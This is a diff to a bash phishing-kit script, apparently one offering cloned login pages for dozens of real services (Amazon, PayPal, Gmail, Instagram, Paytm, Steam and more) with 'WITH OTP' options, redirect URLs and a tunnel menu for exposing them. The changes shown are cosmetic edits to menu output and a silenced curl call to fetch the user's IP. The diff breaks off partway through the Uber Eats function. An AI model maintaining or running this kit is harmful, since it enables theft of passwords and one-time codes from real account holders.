@@ -32,6 +32,7 @@ log_name=$(date +%d-%m-%Y-%H-%M-%S)
 #Normal Banner
 banner(){
 	echo " "
+        echo -e " "
         echo -e "${CYAN}----------------------------------------------------------------${NC} "
 	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
 	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
@@ -1000,7 +1001,7 @@ check_netstats() {
 	fi
 }
 userip() {
-        myip=$(curl ipinfo.io/ip)
+        myip=$(curl -s ipinfo.io/ip)
 	if [ $myip!=127.0.0.1 ]; then
 		myip="${GREEN}$myip"
 	else
@@ -1085,9 +1086,6 @@ echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
 }
 
 mainmenu() {
-echo -e " "
-echo -e " "
-echo -e " "
 banner
 echo -e " "
 echo -e " "
@@ -1289,11 +1287,11 @@ esac
 site_adobe(){
 siname="Adobe"
 rdurl="www.adobe.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1322,11 +1320,11 @@ tunnelmenu
 site_airtelxstream(){
 siname="AirtelXStream"
 rdurl="www.airtelxstream.in"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1348,11 +1346,11 @@ esac
 site_ajio(){
 siname="AJIO"
 rdurl="www.ajio.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1374,11 +1372,11 @@ esac
 site_amazon(){
 siname="Amazon"
 rdurl="www.amazon.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1400,11 +1398,11 @@ esac
 site_apple(){
 siname="Apple"
 rdurl="www.apple.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1426,11 +1424,11 @@ esac
 site_badoo(){
 siname="Badoo"
 rdurl="badoo.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1459,11 +1457,11 @@ tunnelmenu
 site_date(){
 siname="Date (Multiple phish)"
 rdurl="date.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
@@ -1493,11 +1491,11 @@ esac
 site_devianart(){
 siname="Devian Art"
 rdurl="www.deviantart.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1526,11 +1524,11 @@ tunnelmenu
 site_ebay(){
 siname="Ebay"
 rdurl="www.ebay.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1552,11 +1550,11 @@ esac
 site_facebook(){
 siname="Facebook"
 rdurl="www.facebook.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
@@ -1598,11 +1596,11 @@ esac
 site_flipcart(){
 siname="Flipcart"
 rdurl="www.flipcart.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1631,11 +1629,11 @@ tunnelmenu
 site_github(){
 siname="GitHub"
 rdurl="www.github.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1665,11 +1663,11 @@ esac
 site_gitlab(){
 siname="GitLab"
 rdurl="www.gitlab.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1699,11 +1697,11 @@ esac
 site_gmail(){
 siname="Gmail"
 rdurl="www.gmail.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1725,11 +1723,11 @@ esac
 site_google(){
 siname="Google"
 rdurl="www.gmail.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
@@ -1767,11 +1765,11 @@ esac
 site_gpay(){
 siname="Gpay"
 rdurl="pay.google.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1800,11 +1798,11 @@ tunnelmenu
 site_instagram(){
 siname="Instagram"
 rdurl="www.instagram.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
@@ -1873,11 +1871,11 @@ tunnelmenu
 site_jio(){
 siname="JIO"
 rdurl="www.jio.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
@@ -1899,11 +1897,11 @@ esac
 site_linkedin(){
 siname="Linkedin"
 rdurl="linkedin.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1925,11 +1923,11 @@ esac
 site_mediafire(){
 siname="Medifire"
 rdurl="www.mediafire.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1951,11 +1949,11 @@ esac
 site_messenger(){
 siname="Messenger"
 rdurl="www.messenger.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
@@ -1985,11 +1983,11 @@ esac
 site_microsoft(){
 siname="Microsoft"
 rdurl="www.microsoft.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2018,11 +2016,11 @@ tunnelmenu
 site_myspace(){
 siname="MySpace"
 rdurl="myspace.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2044,11 +2042,11 @@ esac
 site_netflix(){
 siname="Netflix"
 rdurl="www.netflix.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2084,11 +2082,11 @@ tunnelmenu
 site_paypal(){
 siname="Paypal"
 rdurl="www.paypal.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2110,11 +2108,11 @@ esac
 site_paytm(){
 siname="Paytm"
 rdurl="paytm.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
@@ -2158,11 +2156,11 @@ tunnelmenu
 site_playstation(){
 siname="PlayStation"
 rdurl="www.playstation.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
@@ -2223,11 +2221,11 @@ tunnelmenu
 site_reddit(){
 siname="Reddit"
 rdurl="www.reddit.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
@@ -2249,11 +2247,11 @@ esac
 site_shopify(){
 siname="Shopify"
 rdurl="www.shopify.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2275,11 +2273,11 @@ esac
 site_snapchat(){
 siname="Snapchat"
 rdurl="www.snapchat.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2301,11 +2299,11 @@ esac
 site_socialclub(){
 siname="SocialClub"
 rdurl="socialclub.rockstargames.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2327,11 +2325,11 @@ esac
 site_spotify(){
 siname="Spotify"
 rdurl="www.spotify.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2353,11 +2351,11 @@ esac
 site_stackoverflow(){
 siname="Stackoverflow"
 rdurl="stackoverflow.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2379,11 +2377,11 @@ esac
 site_steam(){
 siname="Steam"
 rdurl="store.steampowered.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2426,11 +2424,11 @@ tunnelmenu
 site_tiktok(){
 siname="TikTok"
 rdurl="www.tiktok.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
@@ -2481,11 +2479,11 @@ esac
 site_twitter(){
 siname="Twitter"
 rdurl="twitter.com"
-{ clear; banner; echo "/n"; }
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo "\n"
-echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo "\n"
+{ clear; banner; echo -e ""; }
+echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo -e ""; echo -e ""
+echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo -e "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2507,11 +2505,11 @@ esac
 site_ubereats(){
 siname="ubereats"
 rdurl="www.ubereats.com"
-{ clear; banner; echo "/n"; }
